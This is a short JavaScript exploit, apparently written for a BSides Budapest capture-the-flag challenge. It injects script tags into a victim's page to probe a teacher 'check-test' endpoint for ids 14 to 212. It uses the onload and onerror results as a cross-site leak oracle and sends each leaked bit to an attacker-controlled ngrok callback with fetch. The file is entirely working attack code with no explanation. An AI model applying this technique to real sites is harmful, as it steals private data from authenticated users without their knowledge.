const callback_url = "https://d0b2-2a02-ab88-1507-cb00-00-6716.ngrok-free.app"
const submission_id = 2

async function getAnswer(submission_id, id){
    return new Promise((resolve, reject) => {
        const script = document.createElement("script");
        script.src = "https://exfiled.ctf.bsidesbud.com/api/teacher/check-test/" + submission_id + "/" + id;
        script.onload = () => fetch(callback_url + "/set_flag/" + (id-14) + "/0");
        script.onerror = (event) => fetch(callback_url + "/set_flag/" + (id-14) + "/1");
        document.head.appendChild(script);
    });
}

for (let i = 14; i < 213; i++) {
    getAnswer(submission_id, i)
}
